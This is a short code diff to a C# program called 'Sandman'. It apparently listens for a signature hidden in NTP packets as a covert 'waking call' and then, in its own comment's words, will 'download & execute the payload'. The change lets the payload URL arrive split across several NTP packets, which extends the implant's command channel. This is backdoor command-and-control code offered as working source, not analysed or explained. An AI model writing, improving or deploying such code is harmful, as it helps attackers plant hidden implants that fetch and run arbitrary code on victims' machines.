@@ -56,6 +56,8 @@ namespace Sandman
                 // If a waking call found - download & execute the payload.
                 if (signature.All(x => ntpData.Contains(x)))
                 {
+                    int amountOfPackets = 0;
+                    string data = "";
                     string payloadUrl = "";
                     string szPayloadSize = "";
                     int payloadSize = 0;
@@ -64,12 +66,29 @@ namespace Sandman
                     {
                         if (ntpData[i] == 0x00)
                             break;
-                        payloadUrl += (char)ntpData[i];
+                        data += ntpData[i];
                     }
 
-                    socket.Receive(ntpData);
+                    if (int.TryParse(data, out amountOfPackets))
+                    {
+                        for (int i = 0; i < amountOfPackets; i++)
+                        {
+                            socket.Receive(ntpData);
+
+                            for (int j = signature.Length + 1; j < ntpData.Length; j++)
+                            {
+                                if (ntpData[j] == 0x00)
+                                    break;
+                                payloadUrl += (char)ntpData[j];
+                            }
+                        }
+                    }
+                    else
+                        payloadUrl = data;
 
                     // Getting and validating the payload size.
+                    socket.Receive(ntpData);
+                    
                     for (int i = signature.Length + 1; i < ntpData.Length; i++)
                     {
                         if (ntpData[i] == 0x00)
@@ -87,7 +106,7 @@ namespace Sandman
             }
             catch (SocketException)
             {
-                Console.WriteLine("Timeout occured.");
+                Console.WriteLine($"Timeout occured.");
             }
             finally
             {
